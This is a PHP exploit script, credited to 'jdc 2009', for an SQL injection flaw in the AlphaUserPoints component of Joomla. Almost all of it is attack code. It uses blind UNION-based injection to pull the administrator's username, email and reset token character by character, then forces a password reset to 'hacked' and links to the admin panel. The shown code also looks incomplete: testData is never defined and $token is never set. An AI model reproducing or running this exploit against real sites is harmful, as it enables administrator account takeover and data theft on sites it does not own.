Joomla Component AlphaUserPoints SQL Injection Exploit
======================================================



<?php
 echo &#039;<h2>Joomla Component AlphaUserPoints SQL Injection Exploit</h2>&#039;;
 echo &#039;<h4>jdc 2009</h4>&#039;;
 echo &#039;<fieldset><legend>Buffer</legend><div id="update" style="padding:8px;"></div></fieldset>&#039;;
 echo &#039;<script type="text/javascript">var update = document.getElementById("update");</script>&#039;;
   ini_set( "memory_limit", "128M" );
   ini_set( "max_execution_time", 0 );
   set_time_limit( 0 );
   if( !isset( $_GET[&#039;url&#039;] ) ) die( &#039;Usage: &#039;.$_SERVER[&#039;SCRIPT_NAME&#039;].&#039;?url=www.victim.com&#039; );
   $vulnerableFile = "http://".$_GET[&#039;url&#039;]."/components/com_alphauserpoints/assets/ajax/checkusername.php";
   $url = $vulnerableFile;
 $data = array();
 $admin = &#039;&#039;;
 $data[&#039;username2points&#039;] = "1&#039; AND 1=2 UNION SELECT id FROM #__users WHERE gid=25 ORDER BY id ASC LIMIT 1 -- &#039;";
 $output = getData();
 echo &#039;Cheching for exploit...&#039;;
 if( !testData( $output ) ) die( &#039;Failed. Target may have magic quotes on.&#039; );
 echo &#039;done!<br />&#039;;
 if( isset( $_GET[&#039;check&#039;] ) ) die( $output );
 echo &#039;Getting admin username & email (this may take some time)...&#039;;
 for( $i=1;$i<250;$i++ )
 {
     $len = strlen( $admin );
     $continue = FALSE;
   for( $j=32; $j<126; $j++ )
   {
       if( $continue ) continue;
       $data = array( &#039;username2points&#039; => "1&#039; AND 1=2 UNION SELECT id FROM #__users WHERE gid=25 AND ASCII(SUBSTRING(CONCAT(username,0x3a,email),$i,1)) = $j ORDER BY id ASC LIMIT 1 -- &#039;" );
           $output = getData();
           if( testData( $output ) )
           {
             $admin .= chr( $j );
             echo &#039;<script type="text/javascript">update.innerHTML += "&#039;.chr( $j ).&#039;";</script>&#039;;
             $continue = TRUE;
           }
           ob_end_flush();
           ob_flush();
           flush();
   }
   if( $len == strlen( $admin ) ) break;
 }
 if( strlen( $admin ) == 0 ) die( &#039;failed!&#039; );
 echo &#039;<script type="text/javascript">update.innerHTML = "";</script>&#039;;
 echo "done!<br />";
 echo "<h4>$admin</h4>";
 $admin = explode( &#039;:&#039;, $admin );
 echo "<br />Generating token...";
 $url = "http://".$_GET[&#039;url&#039;]."/index.php?option=com_user&view=reset&tmpl=component";
 $data = array();
 if( strlen( $token ) != 32 ) die( &#039;failed!&#039; );
 echo &#039;done!<br />&#039;;
 echo &#039;Resetting password...&#039;;
 $url = "http://".$_GET[&#039;url&#039;]."/index.php?option=com_user&task=requestreset";
 $data = array( &#039;email&#039; => $admin[1], $token => 1 );
 getData();
 echo &#039;done!<br />&#039;;
 echo &#039;Getting Reset Token...&#039;;
 $url = $vulnerableFile;
 $data = array();
 $activation = &#039;&#039;;
 for( $i=1;$i<100;$i++ )
 {
     $len = strlen( $activation );
     $continue = FALSE;
   for( $j=48; $j<126; $j++ )
   {
       if( $continue ) continue;
       $data = array( &#039;username2points&#039; => "1&#039; AND 1=2 UNION SELECT id FROM #__users WHERE gid=25 AND ASCII(SUBSTRING(CONCAT(activation),$i,1)) = $j ORDER BY id ASC LIMIT 1 -- &#039;" );
           $output = getData();
           if( testData( $output ) )
           {
             $activation .= chr( $j );
             echo &#039;<script type="text/javascript">update.innerHTML += "&#039;.chr( $j ).&#039;";</script>&#039;;
             $continue = TRUE;
           }
           ob_end_flush();
           ob_flush();
           flush();
   }
   if( $len == strlen( $activation ) ) break;
 }
 if( strlen( $activation ) == 0 ) die( &#039;failed!&#039; );
 echo &#039;done!<br />&#039;;
 echo &#039;Sending Reset Token...&#039;;
 $url = "http://".$_GET[&#039;url&#039;]."/index.php?option=com_user&view=reset&layout=complete";
 $data = array( &#039;token&#039; => $activation, $token => 1 );
 getData();
 echo &#039;done!<br />&#039;;
 echo &#039;Resetting Password to "hacked"...&#039;;
 $url = "http://".$_GET[&#039;url&#039;]."/index.php?option=com_user&view=reset&layout=complete";
 $data = array( &#039;password1&#039; => &#039;hacked&#039;, &#039;password2&#039; => &#039;hacked&#039;, $token => 1 );
 getData();
 echo &#039;done!<br />&#039;;
 echo &#039;<hr />&#039;;
 echo &#039;You may now log in as admin using the following credentials:<br />&#039;;
 echo &#039;<strong>&#039;.$admin[0].&#039;</strong> / <strong>hacked</strong><br />&#039;;
 echo &#039;<a href="http://&#039;.$_GET[&#039;url&#039;].&#039;/administrator/">Start hacking!</a>&#039;;


 function shutUp( $buffer ) { return false; }
 function getData()
 {
   global $data, $url;
   ob_start( "shutUp" );
   $ch = curl_init();
   curl_setopt( $ch, CURL_TIMEOUT, 120 );
   curl_setopt( $ch, CURL_RETURNTRANSFER, 0 );
   curl_setopt( $ch, CURLOPT_URL, $url );
   curl_setopt( $ch, CURLOPT_COOKIEFILE, &#039;aup.cookie.txt&#039; );
   curl_setopt( $ch, CURLOPT_COOKIEJAR, &#039;aup.cookie.txt&#039; );
   if( count( $data ) > 0 )
   {
           curl_setopt( $ch, CURLOPT_POST, count( $data ) );
           curl_setopt( $ch, CURLOPT_POSTFIELDS, http_build_query( $data ) );
   }
   curl_setopt( $ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)" );
   curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1 );
   $result = curl_exec( $ch );
   curl_close( $ch );
   $return = ob_get_contents();
   ob_end_clean();
   return $return;
 }

/* jdc 2009 */



